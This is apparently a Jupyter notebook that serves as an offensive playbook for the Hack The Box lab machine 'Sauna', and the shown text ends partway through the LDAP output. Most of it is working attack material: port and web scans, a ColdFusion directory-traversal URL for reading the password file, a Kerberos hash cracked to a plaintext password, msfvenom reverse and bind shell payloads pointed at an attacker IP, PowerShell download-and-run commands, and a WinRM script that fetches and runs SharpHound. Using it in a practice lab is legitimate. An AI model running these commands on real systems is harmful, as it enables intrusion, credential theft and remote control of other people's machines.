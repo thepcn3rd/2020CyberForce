{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HacktheBox"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Global Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Output Directory:/home/kali/hackthebox/output\n",
      "Box Directory:/home/kali/hackthebox/output/sauna\n"
     ]
    }
   ],
   "source": [
    "# Single Box\n",
    "nickname = \"sauna\"         # Name of the box\n",
    "dnsName = \"egotistical-bank.local\"\n",
    "aIP = '10.10.10.175'\n",
    "\n",
    "# 2v2 Player Cyber Recon\n",
    "#a2IP = ['10.10.110.101', '10.10.110.102']\n",
    "#d2IP = ['10.10.110.103', '10.10.110.104']\n",
    "\n",
    "# 4v4 Player Cyber Recon\n",
    "#a4IP = ['10.10.110.101', '10.10.110.102', '10.10.110.103', '10.10.110.104']\n",
    "#d4IP = ['10.10.110.105', '10.10.110.106', '10.10.110.107', '10.10.110.108']\n",
    "\n",
    "# SSH Configuration\n",
    "import paramiko\n",
    "sshport = 22\n",
    "username = \"kali\"\n",
    "password = \"kali\"\n",
    "\n",
    "# WinRM Configuration\n",
    "winrmpass = winrmpassword = \"Thestrokes23\"\n",
    "\n",
    "####\n",
    "# Create the Output Directory for the Below Information Gathered\n",
    "currentDir = \"/home/kali/hackthebox\"\n",
    "outputDir = currentDir + \"/output\"\n",
    "print(\"Output Directory:\" + outputDir)\n",
    "!mkdir -p $outputDir\n",
    "\n",
    "# Create directories for the box\n",
    "boxDir = outputDir + \"/\" + nickname\n",
    "print(\"Box Directory:\" + boxDir)\n",
    "!mkdir -p $boxDir"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"index\"></a>\n",
    "## Index\n",
    "\n",
    "[nmap Port Scan Quick](#nmap)\n",
    "\n",
    "[nmap Discover Versions](#nmapsv)\n",
    "\n",
    "[nmap all the ports](#nmapall)\n",
    "\n",
    "[nmap scripts default and safe](#nmapscripts)\n",
    "\n",
    "[nikto](#nikto)\n",
    "\n",
    "[dirb](#dirb)\n",
    "\n",
    "[smbclient](#smbclient)\n",
    "\n",
    "[smbmount](#smbmount)\n",
    "\n",
    "[curl (GET)](#curlget)\n",
    "\n",
    "[Powershell Download](#powerget)\n",
    "\n",
    "[john the ripper](#john)\n",
    "\n",
    "[Create msfvenom payloads](#msfvenom)\n",
    "\n",
    "[metasploit multi-handler](#multihandler)\n",
    "\n",
    "[SSH Paramiko](#sshp)\n",
    "\n",
    "[WinRM](#winrm)\n",
    "\n",
    "[rpcinfo and showmount for NFS Shares](#rpcinfo)\n",
    "\n",
    "[LDAP Search](#ldapsearch)\n",
    "\n",
    "[Impacket - GetNPUsers](#getnpusers)\n",
    "\n",
    "[Linux privesc](#linuxprivesc)\n",
    "\n",
    "[Windows privesc](#windowsprivesc)\n",
    "\n",
    "[Flask Debug Console](#flaskdebug)\n",
    "\n",
    "[Jenkins Script Console](#jenkins)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmap\"></a>\n",
    "## nmap \n",
    "Very quick scan to discover open ports\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -p- --min-rate=1000 -T4 --ipaddr-- -oN nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 19:00 EST\n",
      "Nmap scan report for active (10.10.10.175)\n",
      "Host is up (0.086s latency).\n",
      "Not shown: 65515 filtered ports\n",
      "PORT      STATE SERVICE\n",
      "53/tcp    open  domain\n",
      "80/tcp    open  http\n",
      "88/tcp    open  kerberos-sec\n",
      "135/tcp   open  msrpc\n",
      "139/tcp   open  netbios-ssn\n",
      "389/tcp   open  ldap\n",
      "445/tcp   open  microsoft-ds\n",
      "464/tcp   open  kpasswd5\n",
      "593/tcp   open  http-rpc-epmap\n",
      "636/tcp   open  ldapssl\n",
      "3268/tcp  open  globalcatLDAP\n",
      "3269/tcp  open  globalcatLDAPssl\n",
      "5985/tcp  open  wsman\n",
      "9389/tcp  open  adws\n",
      "49667/tcp open  unknown\n",
      "49673/tcp open  unknown\n",
      "49674/tcp open  unknown\n",
      "49675/tcp open  unknown\n",
      "49686/tcp open  unknown\n",
      "65419/tcp open  unknown\n",
      "\n",
      "Nmap done: 1 IP address (1 host up) scanned in 86.53 seconds\n"
     ]
    }
   ],
   "source": [
    "outputLocation = boxDir + '/nmap.txt'\n",
    "!nmap -p- --min-rate=1000 -T4 $aIP -oN $outputLocation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapsv\"></a>\n",
    "## nmap -sV \n",
    "Discovers the version of the services running if available\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV --ipaddr-- -oN nmapsv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-04 19:07 EST\n",
      "Nmap scan report for active (10.10.10.175)\n",
      "Host is up (0.10s latency).\n",
      "Not shown: 988 filtered ports\n",
      "PORT     STATE SERVICE       VERSION\n",
      "53/tcp   open  domain?\n",
      "80/tcp   open  http          Microsoft IIS httpd 10.0\n",
      "88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-12-05 07:09:46Z)\n",
      "135/tcp  open  msrpc         Microsoft Windows RPC\n",
      "139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n",
      "389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n",
      "445/tcp  open  microsoft-ds?\n",
      "464/tcp  open  kpasswd5?\n",
      "593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n",
      "636/tcp  open  tcpwrapped\n",
      "3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\n",
      "3269/tcp open  tcpwrapped\n",
      "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\n",
      "SF-Port53-TCP:V=7.80%I=7%D=12/4%Time=5FCACF50%P=x86_64-pc-linux-gnu%r(DNSV\n",
      "SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\\n",
      "SF:x04bind\\0\\0\\x10\\0\\x03\");\n",
      "Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows\n",
      "\n",
      "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n",
      "Nmap done: 1 IP address (1 host up) scanned in 163.24 seconds\n"
     ]
    }
   ],
   "source": [
    "outputLocation = boxDir + '/nmapsv.txt'\n",
    "!nmap -Pn -sV $aIP -oN $outputLocation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapall\"></a>\n",
    "## nmap All TCP ports\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV -p- --ipaddr-- -oN nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLocation = boxDir + '/nmapAll.txt'\n",
    "!nmap -sV -p- $aIP -oN $outputLocation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapscripts\"></a>\n",
    "## nmap scripts default,safe\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV --scripts default,safe --ipaddr-- -oN nmapScripts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "outputLocationScripts = boxDir + '/nmapScripts.txt'\n",
    "!nmap -Pn -sV --script default,safe $aIP -oN $outputLocationScripts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Gather the ports of the web servers present\n",
    "results = !cat $outputLocation | grep \"/tcp\" \n",
    "webserverPortList = []\n",
    "print(\"Possible web servers running:\")\n",
    "for r in results:\n",
    "    if \"/tcp\" in r and \"open\" in r and \"Apache\" in r:\n",
    "        print(r)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nikto\"></a>\n",
    "## nikto\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "### nikto settings\n",
    "outputLocationNikto = boxDir + \"/nikto.csv\"\n",
    "url=\"http://\" + dnsName\n",
    "!nikto -h $aIP -o $outputLocationNikto -p 80\n",
    "#!nikto -h $url -o $outputLocationNikto\n",
    "\n",
    "# Below is how to scan multiple ports\n",
    "#!nikto -h $aIP -o $outputLocation -p 80,443  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"dirb\"></a>\n",
    "## dirb\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "### dirb settings\n",
    "outputLocationDirb = boxDir + \"/dirb2.txt\"\n",
    "#url=\"http://\" + dnsName\n",
    "#url=\"http://\" + aIP\n",
    "url = \"http://\" + aIP + \":50000\"\n",
    "wordlist=\"/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\"\n",
    "# -w does not stop on warning messages\n",
    "#!dirb $url $wordlist -w -o $outputLocationDirb\n",
    "!dirb $url -o $outputLocationDirb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"smbclient\"></a>\n",
    "## smbclient\n",
    "\n",
    "[Back to Index](#index)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!smbclient -L $aIP -U anonymous --no-pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"smbmount\"></a>\n",
    "## smbmount\n",
    "\n",
    "[Back to Index](#index)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# smbmount /////--ipaddr or name--//share --folder--"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"curlget\"></a>\n",
    "## curl (GET)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# The following command is a directory traversal on CFIDE to get the administrator password\n",
    "#curlURL = \"http://\" + aIP \n",
    "curlURL = \"http://\" + aIP + \":8500\" + \"/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en\"\n",
    "#!curl -X GET $curlURL\n",
    "resultsCurl = !curl -X GET $curlURL\n",
    "for line in resultsCurl:\n",
    "    if \"password\" in line:\n",
    "        print(line)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"powerget\"></a>\n",
    "## Powershell (GET)\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Newer versions of powershell support the Invoke-Webrequest\n",
    "````\n",
    "$url = \"http://10.10.14.3:8090/Chimichurri.exe\"\n",
    "$output = \"c.exe\"\n",
    "Invoke-WebRequest -Uri $url -OutFile $output\n",
    "````\n",
    "\n",
    "With older versions of powershell you need to use .NET\n",
    "````\n",
    "$w = New-Object System.Net.WebClient\n",
    "$url = \"http://10.10.14.10:8090/file.exe\"\n",
    "$output = \"output.exe\"\n",
    "$w.DownloadFile($url, $file)\n",
    "````\n",
    "The above options can be bundled into a ps1 file and executed.\n",
    "\n",
    "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"john\"></a>\n",
    "## John the Ripper\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Using default input encoding: UTF-8\n",
      "Will run 2 OpenMP threads\n",
      "Press 'q' or Ctrl-C to abort, almost any other key for status\n",
      "1g 0:00:00:17 DONE (2020-12-05 11:07) 0.05636g/s 594067p/s 594067c/s 594067C/s Thing..Thereisnospoon\n",
      "Use the \"--show\" option to display all of the cracked passwords reliably\n",
      "Session completed\n",
      "Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\n",
      "Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)\n"
     ]
    }
   ],
   "source": [
    "### Output Location\n",
    "outputLocationJohn = boxDir + \"/hash.txt\"\n",
    "saveFile = boxDir + \"/john.output\"\n",
    "# Kerberos hashes from Impacket NPUsers does not load properly below, manually load to hash.txt\n",
    "#hash='$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:c5fcbfe4f219b5dd5f8634bd4d67a9d0$99493b26fcd0da4d002167e6d3a55fdaf34ff7371eb335be2a5869f33b771351a1051ce3e8585a20ccbbd440a88ed7d7ba63dcbfc61fae67dc31331b106a2a84fbc299d8ff5f60b017b7b182d3712133d6cf31de66f5ee2ed572fdbbfd8c99330d4065e66438b1e6ba6322da2ddc15c23e234aa0fc82ed349e8a48e2525d1f766fddfd859386e2e333c4a7cdecae6a7a182b3113b05706038c94007f1016d9a69a1ed079ceef8377bce3cbde6b8967f9139b8038a5bc5981ce17101daa427959ca5ccbef9afa153af4743b8024052347be335bba1c986c26572ce935844f08ee34358a6f4d33ef5bb9495f350f99b863a69dd8fb18206f7c1d5a8100bae19ef7'\n",
    "#!echo $hash > $outputLocationJohn\n",
    "# Display the file with the hash in it\n",
    "#!cat $outputLocationJohn\n",
    "\n",
    "# Using Default John wordlist\n",
    "#!/usr/sbin/john $outputLocationJohn > $saveFile\n",
    "\n",
    "# Using Rockyou or a selected wordlist\n",
    "!/usr/sbin/john -wordlist=/usr/share/wordlists/rockyou.txt $outputLocationJohn > $saveFile\n",
    "!cat $saveFile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"msfvenom\"></a>\n",
    "## msfvenom payload Creation\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Reference: https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create an executable that can be run as a windows service to start a bind shell\n",
    "````\n",
    "msfvenom -p windows/x64/meterpreter/bind_tcp lport=8090 -f exe-service\n",
    "````\n",
    "\n",
    "Schedule Task on Coldfusion 8\n",
    "````\n",
    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=8090 -f raw > cold.jsp\n",
    "````"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Payload size: 1496 bytes\r\n"
     ]
    }
   ],
   "source": [
    "outputLocationPayload = boxDir + \"/payload.jsp\"\n",
    "!msfvenom -p  java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=8090 -f raw > $outputLocationPayload"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"multihandler\"></a>\n",
    "## Metasploit Multi-Handler Setup\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Setup: Creates a multihandler file for a metasploit payload being executed or other payload that could connect back"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "port=8090\n",
    "outputLocationmhandler = boxDir + \"/mhandler.rc\"\n",
    "f = open(outputLocationmhandler, 'w')\n",
    "f.write(\"use exploit/multi/handler\")\n",
    "f.write(\"set payload windows/x64/meterpreter/bind_tcp\")\n",
    "f.write(\"set RHOSTS \" + aIP)\n",
    "f.write(\"set RPORT \" + str(port))\n",
    "f.close()\n",
    "\n",
    "print(\"Execute to Start: msfconsole -r \" + outputLocationmhandler)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sshp\"></a>\n",
    "## SSH Paramiko\n",
    "\n",
    "### Creates a journal file that can be viewed\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#commandList = ['uname -a']\n",
    "commandList = ['uname -a', 'ps -aef --forest', 'netstat -anop']\n",
    "\n",
    "# To investigate a process use the below...\n",
    "processID = \"1225\"\n",
    "pcmd = \"ls -la /proc/\" + processID + \"/cwd\"\n",
    "pcmd2 = \"ss -anp | grep \" + processID\n",
    "#commandList = [pcmd, pcmd2] \n",
    "\n",
    "ssh = paramiko.SSHClient()\n",
    "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "ssh.connect(aIP, sshport, username, password)\n",
    "\n",
    "# Record output in journal\n",
    "outputLocationJournal = boxDir + \"/journal.txt\"\n",
    "f = open(outputLocationJournal, 'a')\n",
    "for c in commandList:\n",
    "    stdin, stdout, stderr = ssh.exec_command(c)\n",
    "    jlines = stdout.readlines()\n",
    "    #print(jlines)\n",
    "    print(\"\\nCommand: \" + c)\n",
    "    print(\"Output\")\n",
    "    for j in jlines:\n",
    "        print(j.strip())\n",
    "\n",
    "    f.write(\"\\n\\nCommand: \" + c)\n",
    "    f.write(\"\\nOutput\\n\")\n",
    "    for jline in jlines:\n",
    "        f.write(jline)\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### View Journal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!cat $outputLocationJournal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Roll Journal  (Warning clears Journal)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLocationArchive = boxDir + \"/journal_archive.txt\"\n",
    "!touch $outputLocationArchive\n",
    "!cat $outputLocationArchive $outputLocationJournal > $outputLocationArchive\n",
    "!rm $outputLocationJournal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"winrm\"></a>\n",
    "## Windows Remote Management WinRM\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[?1h\u001b=\u001b[6n\u001b[6n\u001b[6n\u001b[6n\u001b[6n\u001b[6n\u001b[6n\u001b[6n\u001b[1;1H                                                                                                                                                                                                                                                                                                                                \u001b[1;1H                                                                                 Writing web request                                                                Writing request stream... (Number of bytes written: 10000)                                                                                                  \u001b[1;1H                                                                                                                                                                                                                                                                                                                                \u001b[1;1H"
     ]
    }
   ],
   "source": [
    "# Settings \n",
    "winrmusername = \"fsmith\"\n",
    "winrmpassword = \"Thestrokes23\"\n",
    "\n",
    "#poshCommand = \"Get-Location\"\n",
    "#poshCommand = \"whoami; whoami /groups; whoami /priv\"\n",
    "\n",
    "# Download a file\n",
    "# Sharphound Locations: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors\n",
    "\n",
    "# Takes a while for the command to complete based on the size of the file\n",
    "poshCommand = \"Invoke-WebRequest -Uri http://10.10.14.10:8090/SharpHound.ps1 -Outfile SharpHound.ps1\"\n",
    "# Step 2 of Sharphound\n",
    "poshCommand2 = \"Import-Module .\\SharpHound.ps1\"\n",
    "# Step 3 of Sharphound\n",
    "poshCommand3 = \"Invoke-BloodHound -CollectionMethod All\"\n",
    "# Step 4 is to Copy the file from a remote session...\n",
    "#Copy-Item -Path c:\\users\\svc-alfresco\\Documents\\20201030201503_BloodHound.zip -Destination . -FromSession $s\n",
    "\n",
    "# Gather users flag on hackthebox\n",
    "#poshCommand = \"Get-Content -Path c:\\\\users\\\\\" + winrmusername + \"\\\\Desktop\\\\user.txt\"\n",
    "\n",
    "scriptPath = boxDir + \"/ps.ps1\"\n",
    "f = open(scriptPath, \"w\")\n",
    "f.write(\"#!/usr/bin/pwsh\\n\")\n",
    "f.write(\"$pw = Convertto-Securestring -AsPlainText -Force -String \\\"\" + winrmpassword + \"\\\"\\n\")\n",
    "f.write(\"$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist \\\"\" + winrmusername + \"\\\",$pw\" + \"\\n\")\n",
    "f.write(\"$s = New-PSSession -Computername \" + aIP + \" -Authentication Negotiate -Credential $cred\\n\")\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand + \"}\\n\")\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand2 + \"}\\n\")\n",
    "f.write(\"Invoke-Command -Session $s {\" + poshCommand3 + \"}\\n\")\n",
    "f.close()\n",
    "\n",
    "!chmod 700 $scriptPath\n",
    "!$scriptPath\n",
    "\n",
    "print(\"Completed Commands!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"rpcinfo\"></a>\n",
    "## rpcinfo and showmount for NFS shares\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "rpcinfo -p --ipaddr--\n",
    "showmount -e --ipaddr--\n",
    "mount --ipaddr--:--directoryshared-- /mountpoint\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"ldapsearch\"></a>\n",
    "## ldapsearch\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "ldapsearch -h 10.10.10.161 -p 389 -x -b \"dc=htb,dc=local\"\n",
    "\n",
    "** This is only allowed if you do not have to authenticate to the domain\n",
    "\n",
    "?? What do you do when you have to authenticate to the domain? How does the command change?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# extended LDIF\r\n",
      "#\r\n",
      "# LDAPv3\r\n",
      "# base <dc=egotistical-bank,dc=local> with scope subtree\r\n",
      "# filter: (objectclass=*)\r\n",
      "# requesting: ALL\r\n",
      "#\r\n",
      "\r\n",
      "# EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "objectClass: top\r\n",
      "objectClass: domain\r\n",
      "objectClass: domainDNS\r\n",
      "distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "instanceType: 5\r\n",
      "whenCreated: 20200123054425.0Z\r\n",
      "whenChanged: 20201205065832.0Z\r\n",
      "subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "uSNCreated: 4099\r\n",
      "dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==\r\n",
      "uSNChanged: 57366\r\n",
      "name: EGOTISTICAL-BANK\r\n",
      "objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==\r\n",
      "replUpToDateVector:: AgAAAAAAAAADAAAAAAAAAKuM73jRSYVEssLtnGX+r60M4AAAAAAAAJfA2\r\n",
      " xUDAAAA/VqFkkbeXkGqVm5qQCP2DAvQAAAAAAAA0PAKFQMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAA\r\n",
      " AAAADUBFIUAwAAAA==\r\n",
      "creationTime: 132516251123435384\r\n",
      "forceLogoff: -9223372036854775808\r\n",
      "lockoutDuration: -18000000000\r\n",
      "lockOutObservationWindow: -18000000000\r\n",
      "lockoutThreshold: 0\r\n",
      "maxPwdAge: -36288000000000\r\n",
      "minPwdAge: -864000000000\r\n",
      "minPwdLength: 7\r\n",
      "modifiedCountAtLastProm: 0\r\n",
      "nextRid: 1000\r\n",
      "pwdProperties: 1\r\n",
      "pwdHistoryLength: 24\r\n",
      "objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG\r\n",
      "serverState: 1\r\n",
      "uASCompat: 1\r\n",
      "modifiedCount: 1\r\n",
      "auditingPolicy:: AAE=\r\n",
      "nTMixedDomain: 0\r\n",
      "rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name\r\n",
      " ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "systemFlags: -1946157056\r\n",
      "wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT\r\n",
      " ISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra\r\n",
      " m Data,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO\r\n",
      " TISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin\r\n",
      " cipals,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=\r\n",
      " EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E\r\n",
      " GOTISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO\r\n",
      " TISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC\r\n",
      " AL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,\r\n",
      " DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS\r\n",
      " TICAL-BANK,DC=LOCAL\r\n",
      "wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA\r\n",
      " L-BANK,DC=LOCAL\r\n",
      "objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D\r\n",
      " C=LOCAL\r\n",
      "isCriticalSystemObject: TRUE\r\n",
      "gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste\r\n",
      " m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]\r\n",
      "dSCorePropagationData: 16010101000000.0Z\r\n",
      "otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS\r\n",
      " TICAL-BANK,DC=LOCAL\r\n",
      "otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic\r\n",
      " e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN\r\n",
      " =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "ms-DS-MachineAccountQuota: 10\r\n",
      "msDS-Behavior-Version: 7\r\n",
      "msDS-PerUserTrustQuota: 1\r\n",
      "msDS-AllUsersTrustQuota: 1000\r\n",
      "msDS-PerUserTrustTombstonesQuota: 10\r\n",
      "msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na\r\n",
      " me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N\r\n",
      " ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "msDS-NcType: 0\r\n",
      "msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE\r\n",
      "dc: EGOTISTICAL-BANK\r\n",
      "\r\n",
      "# Users, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
      "# Computers, EGOTISTICAL-BANK.LOCAL\r\n",
      "dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL\r\n",
      "\r\n",
